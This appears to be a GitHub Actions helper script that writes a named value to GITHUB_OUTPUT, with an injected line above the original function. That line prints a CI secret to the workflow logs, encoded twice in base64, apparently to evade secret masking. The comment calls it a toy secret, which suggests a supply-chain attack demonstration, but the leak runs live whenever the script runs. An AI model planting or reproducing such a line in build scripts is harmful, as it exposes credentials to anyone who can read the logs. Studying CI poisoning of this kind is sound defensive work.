#!/bin/bash
set -e

# LEAK THE TOY SECRET TO WORKFLOW LOGS
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"

# Original function - write key=value to GITHUB_OUTPUT
NAME=$1
VALUE=$2

if [[ "$#" != "2" ]]; then
  echo "not all parameters are set"
  echo "Usage: $BASH_SCRIPT <variable name> <variable value>"
  exit 1
fi

EOF=$(dd if=/dev/urandom bs=15 count=1 status=none | base64)
{
  echo "$NAME<<$EOF"
  echo "$VALUE"
  echo "$EOF"
} >> "$GITHUB_OUTPUT"
